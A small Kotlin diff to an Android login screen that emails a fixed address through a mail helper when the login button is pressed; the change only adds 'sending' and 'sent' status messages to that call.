@@ -29,10 +29,9 @@ class Login : AppCompatActivity() {
 
     fun onClickLogin(view: View) {
         if(isValidName()) {
-//            sendMessage()
             val recipients =
                 arrayOf<String>("prsn.online@gmail.com")
-            SendMailTrigger().sendMessage(recipients, getSubject(), getMailBody(), findViewById(R.id.loginPassword))
+            SendMailTrigger().sendMessage(recipients, getSubject(), getMailBody(), findViewById(R.id.loginPassword), "Sending Request...", "Request Sent...")
         } else {
             Toast.makeText(this, "Enter a Valid Name", Toast.LENGTH_LONG).show()
         }
